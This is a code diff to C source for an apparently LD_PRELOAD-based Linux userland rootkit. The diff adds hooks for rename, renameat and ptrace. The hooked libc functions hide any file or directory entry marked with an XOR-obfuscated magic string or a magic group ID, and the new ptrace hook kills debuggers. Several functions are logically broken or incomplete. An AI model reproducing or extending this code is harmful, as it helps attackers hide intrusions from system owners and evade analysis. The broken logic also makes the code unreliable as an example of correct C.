@@ -6,13 +6,9 @@
 #include <dlfcn.h> 
 #include <fcntl.h>
 #include <errno.h> 
-#include <utmp.h>
-#include <utmpx.h>
 #include <sys/stat.h>
-#include <sys/ioctl.h> 
-#include <sys/types.h> 
+#include <sys/types.h>
 #include <errno.h> 
-#include <termios.h> 
 #include <netinet/in.h> 
 #include <dirent.h>
 #include <limits.h> 
@@ -20,41 +16,14 @@
 #include "utils/catflap.h"
 #include "rkconst.h"
 
-/*
-  ==========HOOKS============
- * execve 
- * chmod 
- * ptrace (wait no lol)
- * fgets
- * directory functions 
- |-> readdir 
- |-> chdir 
- |-> mkdir 
- |-> mkdirat 
- |-> rmdir 
- |-> opendir
- |-> fdopendir
- * file linking functions
- |-> link 
- |-> linkat
- |-> unlink 
- |-> unlinkat 
- |-> symlink 
- |-> symlinkat 
- * file open functions 
- |-> access 
- |-> fopen 
- * file status functions 
- |-> stat 
- |-> fstat 
- |-> fstatat 
- |-> lstat
- ============================
-*/
+
 //function pointers to hooked functions
+
+//misc
 int (*old_execve)(const char *path, char *const argv[], char *const envp[]); 
 int (*old_chmod)(const char *pathname, mode_t mode); 
 char *(*old_fgets)(char *s, int size, FILE *stream);
+long (*old_ptrace)(void *request, pid_t pid, void *addr, int data);
 
 //directory functions
 struct dirent *(*old_readdir)(DIR *dirp);
@@ -74,6 +43,10 @@ int (*old_symlink)(const char *path1, const char *path2);
 int (*old_access)(const char *path, int amode); 
 int (*old_faccessat)(int fd, const char *path, int amode, int flag); 
 FILE *(*old_fopen)(const char *pathname, const char *mode); 
+
+//file naming functions 
+int (*old_rename)(const char *oldpath, const char *newpath);
+int (*old_renameat)(int olddirfd, const char *oldpath, int newdirfd, const char *newpath);
 
 //stat functions
 int (*old_stat)(const char *path, struct stat *buf);
@@ -103,6 +76,12 @@ int owned(void)
 	return x; 
 } 
 
+long ptrace(void *request, pid_t pid, void *addr, int data)
+{
+	HOOK(ptrace);
+	printf("bl1ng bl1ng"); 
+	exit(-1);
+}
 
 int execve(const char *path, char *const argv[], char *const envp[])
 {
@@ -171,8 +150,7 @@ int stat(const char *path, struct stat *buf)
 		{
 			errno = ENOENT; 
 			return -1; 
-		}
-	       	CLEAN(magic);	
+		}	
 		return old_stat(path, buf); 
 	} 
 	CLEAN(magic);
@@ -221,7 +199,7 @@ int __xstat(int ver, const char *path, struct stat *buf)
 	
 	memset(&s_fstat, 0, sizeof(stat)); 
 	
-	if (strstr(path, magic) || !strcmp(s_fstat_st.gid, MAGICGID))
+	if (strstr(path, magic) || !strcmp(s_fstat.st_gid, MAGICGID))
 	{ 
 		errno = ENOENT; 
 		return -1; 
@@ -234,10 +212,8 @@ int lstat(const char *pathname, struct stat *buf)
 	HOOK(lstat); 
 	#ifdef DEBUG 
 	printf("[!] lstat hooked"); 
-	#ifdef DEBUG
+	#endif
 	struct stat filestat; 
-	CLEAN(filestat); 
-	
 	if (owned())
 	{ 
 		old_lstat(pathname, &filestat);
@@ -248,14 +224,10 @@ int lstat(const char *pathname, struct stat *buf)
 			return -1; 
 		}
 		CLEAN(magic); 
-		CLEAN(filestat);
 		return old_lstat(pathname, buf);
-		}
-	CLEAN(magic); 
-	CLEAN(filestat);
+		} 
 	return old_lstat(pathname, buf);
 }
-
 
 int link(const char *oldpath, const char *newpath)
 { 
@@ -276,11 +248,9 @@ int link(const char *oldpath, const char *newpath)
 			return -1;
 		} 
 		CLEAN(magic); 
-		CLEAN(filestat);
 		return old_link(oldpath, newpath); 
 	} 
 	CLEAN(magic);
-	CLEAN(filestat);
 	return old_link(oldpath, newpath); 
 } 
  
@@ -303,11 +273,10 @@ int unlink(const char *path)
 			return -1; 
 		}
 		CLEAN(magic); 
-		CLEAN(filestat);
+	
 		return old_unlink(path); 
 	} 
 	CLEAN(magic);
-	CLEAN(filestat);
 	return old_unlink(path); 
 } 
 
@@ -330,16 +299,53 @@ int symlink(const char *path1, const char *path2)
 			errno = ENOENT; 
 	 		return -1;
 	        }
-		CLEAN(magic);
-		CLEAN(filestat1);
-		CLEAN(filestat2);
+		CLEAN(magic);	
 		return old_symlink(path1, path2); 
 	}	
 	CLEAN(magic);
-	CLEAN(filestat1);
-	CLEAN(filestat2);
 	return old_symlink(path1, path2); 
-}		
+}	
+
+int rename(const char *oldpath, const char *newpath)
+{
+	HOOK(rename);
+	#ifdef DEBUG
+	printf("[!] rename hooked");
+	#endif
+	if (owned())
+	{
+		char *magic = strdup(MAGIC); xor(magic);
+		if (strstr(oldpath, magic))
+		{
+			errno = ENOENT; 
+			return -1; 
+		}
+		CLEAN(magic);
+		return old_rename(oldpath, newpath);
+	}
+}
+
+int renameat(int olddirfd, const char *oldpath, int newdirfd, const char *newpath)
+{ 
+	HOOK(renameat); 
+	#ifdef DEBUG
+	printf("[!] renameat hooked"); 
+	#endif
+	if (owned())
+	{ 
+		char *magic = strdup(MAGIC); xor(magic);
+		if (strstr(oldpath, magic))
+		{
+			errno = ENOENT; 
+			return -1; 
+		}
+		CLEAN(magic);
+		return old_renameat(olddirfd, oldpath, newdirfd, newpath);
+	}
+	return old_renameat(olddirfd, oldpath, newdirfd, newpath);
+}
+
+
 /*
    _                       
   (_)_ _    ___ ____ ___ __
@@ -363,19 +369,18 @@ struct dirent *readdir(DIR *dirp)
 	do
 	{ 
 		dir = old_readdir(dirp); 
-		if (dir != NULL && (!strcmp(dir->d_name, ".\0") == 0) || strcmp(dir->d_name, "/\0")) 
+		if ((dir != NULL && (!strcmp(dir->d_name, ".\0") == 0)) || strcmp(dir->d_name, "/\0")) 
 			continue; 
 		if (dir != NULL)
 		{ 
 			char path[PATH_MAX + 1];
-			proc = strdup(PROC); xor(PROC);
+			char *proc = strdup(PROC); xor(PROC);
 			snprintf(path, PATH_MAX, proc,  dir->d_name); 
 			old___xstat(_STAT_VER, path, &filestat); 
 			if (strstr(path, MAGIC) || filestat.st_gid == MAGICGID)
-				continue;
-			CLEAN(filestat); 
+				continue;	
 		}
-	}while (dir && (s_fstat.st_gid == magic)); 
+	}while (dir && (filestat.st_gid == magic)); 
 
 	return dir;	
 } 
@@ -460,11 +465,9 @@ int rmdir(const char *pathname)
 			return -1; 
 		} 
 		CLEAN(magic);
-		CLEAN(filestat);
 		return old_rmdir(pathname); 
 	} 
 	CLEAN(magic);
-	CLEAN(filestat);
 	return old_rmdir(pathname); 
 } 
 
@@ -531,11 +534,9 @@ FILE *fopen(const char *pathname, const char *mode)
 			return -1;
 		} 
 		CLEAN(magic);
-		CLEAN(filestat);
 		return old_fopen(pathname, mode); 
 	} 
 	CLEAN(magic);
-	CLEAN(filestat);
 	return old_fopen(pathname, mode); 
 } 
 
@@ -571,7 +572,6 @@ char *fgets(char *s, int size, FILE *stream)
 	}
 	return p;
 }		
-
 
 void init(void)
 { 
